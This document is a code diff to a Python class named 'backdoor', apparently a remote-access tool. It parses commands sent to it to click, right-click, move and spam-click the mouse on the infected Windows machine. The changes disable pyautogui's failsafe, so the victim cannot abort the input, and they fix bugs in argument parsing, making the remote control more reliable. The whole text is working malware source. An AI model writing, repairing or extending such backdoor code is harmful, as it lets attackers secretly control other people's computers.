@@ -1,5 +1,6 @@
+from codeop import CommandCompiler
 import sqlite3,socket,os,time,datetime,keyboard,winreg,pyautogui
-
+pyautogui.FAILSAFE = False
 class backdoor:
     def __init__(self):
         # hard_drive_name = os.getcwd().split(":")
@@ -128,8 +129,9 @@ class backdoor:
                         mouse_command_args = mouse_command.replace("right_click", "")
                         mouse_command_args = mouse_command_args.replace("(", "")
                         mouse_command_args = mouse_command_args.replace(")", "")
+                        mouse_command_args = mouse_command_args.replace(" ", "")
                         mouse_command_args = mouse_command_args.split(",")
-                        if len(mouse_command_args) > 0:
+                        if len(mouse_command_args) > 1:
                             mouse_command_args = list(map(int,mouse_command_args))
                             pyautogui.click(mouse_command_args[0], mouse_command_args[1], button="right")
                             continue
@@ -140,8 +142,9 @@ class backdoor:
                         mouse_command_args = mouse_command.replace("click", "")
                         mouse_command_args = mouse_command_args.replace("(", "")
                         mouse_command_args = mouse_command_args.replace(")", "")
+                        mouse_command_args = mouse_command_args.replace(" ", "")
                         mouse_command_args = mouse_command_args.split(",")
-                        if len(mouse_command_args) > 0:
+                        if len(mouse_command_args) > 1:
                             mouse_command_args = list(map(int,mouse_command_args))
                             pyautogui.click(mouse_command_args[0], mouse_command_args[1])
                             continue
@@ -152,6 +155,7 @@ class backdoor:
                         mouse_command_args = mouse_command.replace("move", "")
                         mouse_command_args = mouse_command_args.replace("(", "")
                         mouse_command_args = mouse_command_args.replace(")", "")
+                        mouse_command_args = mouse_command_args.replace(" ", "")
                         mouse_command_args = mouse_command_args.split(",")
                         mouse_command_args = list(map(int,mouse_command_args))
                         if len(mouse_command_args) == 2:
@@ -160,9 +164,10 @@ class backdoor:
                         else:
                             output += "Invalid amount of arguments. Two arguments needed. X,Y\n"
                     elif mouse_command.startswith("spam_click"):
-                        mouse_command_args = mouse_command.replace("move", "")
+                        mouse_command_args = mouse_command.replace("spam_click", "")
                         mouse_command_args = mouse_command_args.replace("(", "")
                         mouse_command_args = mouse_command_args.replace(")", "")
+                        mouse_command_args = mouse_command_args.replace(" ", "")
                         mouse_command_args = mouse_command_args.split(",")
                         mouse_command_args = list(map(int,mouse_command_args))
                         if len(mouse_command_args) == 3:
